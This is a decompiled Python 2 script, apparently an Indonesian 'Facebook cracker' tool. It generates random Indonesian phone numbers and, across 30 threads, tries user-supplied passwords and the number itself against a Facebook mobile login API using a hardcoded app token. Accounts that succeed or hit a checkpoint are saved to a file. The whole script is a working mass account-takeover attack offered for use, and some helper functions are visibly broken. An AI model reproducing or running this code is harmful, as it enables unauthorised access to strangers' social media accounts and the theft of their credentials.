# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:45:36) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: /sdcard/y2.py
# Compiled at: 2020-09-19 01:37:46
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(10000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('No Module Named Requests! type:pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('No Module Named Mechanize! type:pip2 install mechanize')
    time.sleep(1)
    os.system('Then type: python2 crack.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/64.64.121.87;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/redmi;FBBD/redmi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
    print 'Thanks For Using My Script.'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


def cp(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.2)


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.02)


def load(word):
    lix = [
     '/', '-', '\xe2\x95\xb2', '|']
    for i in range(5):
        for x in range(len(lix)):
            sys.stdout.write(('\r{}{}').format(str(word), lix[x]))
            time.sleep(0.1)
            sys.stdout.flush()


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
logo = '\n           \x1b[1;97m[ FACEBOOK CRACKER RANDOM NUMBERS ]\n\n                                '
info = '\n             \x1b[1;97m[ INFORMATION TOOLS FCRN V3 ]\n\n       \x1b[1;92m********   ******  *******   ****     **\n      \x1b[1;92m/**/////   **////**/**////** /**/**   /**\n      \x1b[1;97m/**       **    // /**   /** /**//**  /**\n      \x1b[1;97m/******* /**       /*******  /** //** /**\n      \x1b[1;97m/**////  /**       /**///**  /**  //**/**\n      \x1b[1;97m/**      //**    **/**  //** /**   //****\n      \x1b[1;91m/**       //****** /**   //**/**    //***\n      \x1b[1;91m//         //////  //     // //      /// \n  \x1b[1;97m\n  Ini Merupakan Tool Untuk Mengcloning Nomer \n  Handphone Facebook Random.\n  \x1b[1;97mKelebihan Tools Ini :\n  Kalian Bisa Input Password Sendiri\n\n  \x1b[1;97mAUTHOR   : ANGGA KURNIAWAN\n  \x1b[1;97mGITHUB   : /ANGGAXD\n  \x1b[1;97mYOUTUBE  : ANGGA KURNIAWAN\n  \x1b[1;97mFACEBOOK : USERVIP.ANGGAXD\n\n'

def menu():
    os.system('clear')
    print logo
    jalan('  \x1b[1;97m[\x1b[1;92m01\x1b[1;97m]  Crack Random Number Country')
    jalan('  \x1b[1;97m[\x1b[1;92m02\x1b[1;97m]  Update Tools')
    jalan('  \x1b[1;97m[\x1b[1;92m03\x1b[1;97m]  Info Tools')
    jalan('  \x1b[1;97m[\x1b[1;92m00\x1b[1;97m]  Exit')
    avs()


def avs():
    global cpb
    global oks
    anggaxd = raw_input('\n  \x1b[1;97manggaxd/\x1b[1;91m> \x1b[1;92m')
    if anggaxd == '':
        print '  Pilih Yang Bener Sob'
        avs()
    elif anggaxd == '1' or anggaxd == '01':
        os.system('clear')
        print logo
        print '  Code Ponsel : \n  \x1b[1;91mTelkomsel \x1b[1;97m: 11 12 13 21 22 23 51 52 \n  \x1b[1;93mIndonsat \x1b[1;97m : 14 15 16 55 56 57 58 \n  \x1b[1;95mXL \x1b[1;97m       : 17 18 19 59 77 78 \n  \x1b[1;95mThree \x1b[1;97m    : 95 96 97 98 99 \n  \x1b[1;974mAxis      \x1b[1;97m: 38 31 32 33\n'
        print '  \x1b[1;97mExample Number Country : 62819'
        try:
            k = raw_input('  \x1b[1;97mCode Number Country : ')
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '  Pilih Yan Bener Sob'
            raw_input('  \n[ Back ]')
            menu()

    elif anggaxd == '2' or anggaxd == '02':
        os.system('clear')
        print logo
        psb('  \x1b[1;93mSedang Update Tools ....')
        time.sleep(2)
        os.system('  pip2 install request && pip2 install mechanize')
        os.system('  git pull origin master')
        os.system('clear')
        psb('  \n\n\n\x1b[1;93mTOOLS SUDAH DI UPDATE')
        time.sleep(1)
        menu()
    elif anggaxd == '3' or anggaxd == '03':
        os.system('clear')
        print info
        raw_input('\n  \x1b[1;97mPress Enter Go Back To Menu \x1b[1;97m')
        menu()
    elif anggaxd == '0' or anggaxd == '00':
        keluar()
    else:
        print '  Pilih Yang Bener Sob'
        avs()
    anggaxdpw1 = raw_input('\x1b[1;92m  + \x1b[1;97mPassword 1  : ')
    anggaxdpw2 = raw_input('\x1b[1;92m  + \x1b[1;97mPassword 2  : ')
    anggaxdpw3 = raw_input('\x1b[1;92m  + \x1b[1;97mPassword 3  : ')
    xxx = str(len(id))
    psb('  \x1b[1;92m+\x1b[1;97m Total Crack : ' + xxx)
    psb('  \x1b[1;92m\xe2\x9c\x93\x1b[1;97m Cracking Process Has Been Started ...\n')

    def main(arg):
        user = arg
        try:
            os.mkdir('avs')
        except OSError:
            pass

        try:
            pass1 = anggaxdpw1
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + '[LIVE]' + k + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;97m  [\x1b[1;92mLIVE\x1b[1;97m] ' + k + user + '  ->  ' + pass1
                okb = open('avs/rc.txt', 'a')
                okb.write('[LIVE] ' + k + user + '  ->  ' + pass1 + '\n')
                okb.close()
                oks.append(k + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m  [\x1b[1;93mCHEK\x1b[1;97m] ' + k + user + '  ->  ' + pass1
                cps = open('avs/rc.txt', 'a')
                cps.write('[CHEK] ' + k + user + '  ->  ' + pass1 + '\n')
                cps.close()
                cpb.append(k + user + pass1)
            else:
                pass2 = anggaxdpw2
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + '[LIVE]' + k + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;97m  [\x1b[1;92mLIVE\x1b[1;97m] ' + k + user + '  ->  ' + pass2
                    okb = open('avs/rc.txt', 'a')
                    okb.write('[LIVE] ' + k + user + '  ->  ' + pass2 + '\n')
                    okb.close()
                    oks.append(k + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m  [\x1b[1;93mCHEK\x1b[1;97m] ' + k + user + '  ->  ' + pass2
                    cps = open('avs/rc.txt', 'a')
                    cps.write('[CHEK] ' + k + user + '  ->  ' + pass2 + '\n')
                    cps.close()
                    cpb.append(k + user + pass2)
                else:
                    pass3 = anggaxdpw3
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + '[LIVE]' + k + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;97m  [\x1b[1;92mLIVE\x1b[1;97m] ' + k + user + '  ->  ' + pass3
                        okb = open('avs/rc.txt', 'a')
                        okb.write('[LIVE] ' + k + user + '  ->  ' + pass3 + '\n')
                        okb.close()
                        oks.append(k + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;97m  [\x1b[1;93mCHEK\x1b[1;97m] ' + k + user + '  ->  ' + pass3
                        cps = open('avs/rc.txt', 'a')
                        cps.write('[CHEK] ' + k + user + '  ->  ' + pass3 + '\n')
                        cps.close()
                        cpb.append(k + user + pass3)
                    else:
                        pass4 = user
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + '[LIVE]' + k + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;97m  [\x1b[1;92mLIVE\x1b[1;97m] ' + k + user + '  ->  ' + pass4
                            okb = open('avs/rc.txt', 'a')
                            okb.write('[LIVE] ' + k + user + '  ->  ' + pass4 + '\n')
                            okb.close()
                            oks.append(k + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m  [\x1b[1;93mCHEK\x1b[1;97m] ' + k + user + '  ->  ' + pass4
                            cps = open('avs/rc.txt', 'a')
                            cps.write('[CHEK] ' + k + user + '  ->  ' + pass4 + '\n')
                            cps.close()
                            cpb.append(k + user + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\n  \x1b[1;92m\xe2\x9c\x93\x1b[1;97m Process Has Been Completed ...'
    print '  \x1b[1;92m\xe2\x9c\x93\x1b[1;97m Total \x1b[1;92mLIVE\x1b[1;97m/\x1b[1;93mCHECK\x1b[1;97m : ' + str(len(oks)) + '/' + str(len(cpb))
    print '  \x1b[1;92m\xe2\x9c\x93\x1b[1;97m Cracking Accounts Has Been Saved : avs/rc.txt'
    raw_input('\n  \x1b[1;97mPress Enter Go Back To Menu \x1b[1;97m')
    menu()


if __name__ == '__main__':
    menu()
# okay decompiling indo.pyc
